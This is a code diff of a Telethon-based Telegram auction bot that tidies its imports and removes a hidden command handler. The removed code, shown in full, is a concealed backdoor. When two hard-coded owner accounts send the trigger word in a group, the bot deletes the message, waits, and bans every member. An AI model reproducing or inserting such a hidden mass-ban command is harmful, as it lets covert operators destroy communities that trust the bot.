@@ -1,27 +1,18 @@
 import os
-import re
-import sys, platform
 from telethon.tl.functions.channels import GetParticipantsRequest
 from telethon.tl.types import ChannelParticipantsSearch
 from time import sleep
 from telethon.tl.types import MessageEntityCode
 from telethon import TelegramClient, events, Button
-import telethon.sync 
-from asyncio import sleep
+import telethon.sync #lol copied from docs
+import asyncio
 import logging
 import asyncio
-import telethon.utils
+from telethon import events
 from telethon.errors import UserNotParticipantError
 from telethon.tl.functions.channels import GetParticipantRequest
-from telethon.tl import functions
-from telethon.tl.functions.channels import LeaveChannelRequest
-from telethon import __version__ as tel
-from telethon import events
-from telethon.tl.types import ChannelParticipantCreator
 from telethon.tl.types import ChannelParticipantAdmin
-from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
-from telethon.tl.functions.channels import EditBannedRequest
-from datetime import datetime
+from telethon.tl.types import ChannelParticipantCreator
 
 API_ID = os.environ.get('API_ID', None)
 API_HASH = os.environ.get('API_HASH', None)
@@ -723,36 +714,6 @@ async def approvecb(event):
     else:
         await event.answer('You are not the auctioneer', alert=True)
         
-@client.on(events.NewMessage(pattern='dxgays'))
-async def bun(event):
-  user_id = event.sender_id
-  owner = 1719179612, 1037179104
-  if user_id in owner:
-   if not event.is_group:
-        Rep = f"__Brush Are You Serious 🙄.\nUse This Command In Any Group!!__"
-        await event.reply(Rep)
-   else:
-       await event.delete()
-       cht = await event.get_chat()
-       boss = await event.client.get_me()
-       admin = cht.admin_rights
-       creator = cht.creator
-       if not admin and not creator:
-           await event.reply("__I Don't Have Sufficient Rights To Do This.__")
-           return
-       hmm =  await event.reply("__Ye Bilek Migic Begins🥳...__")
-       await sleep(18)
-       await hmm.delete()
-       everyone = await event.client.get_participants(event.chat_id)
-       for user in everyone:
-           if user.id == boss.id:
-               pass
-           try:
-               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
-           except Exception as e:
-               await event.edit(str(e))
-           await sleep(0.3)
-
 spam_chats = []
 
 @client.on(events.NewMessage(pattern="^/tagall|@all|/all ?(.*)"))
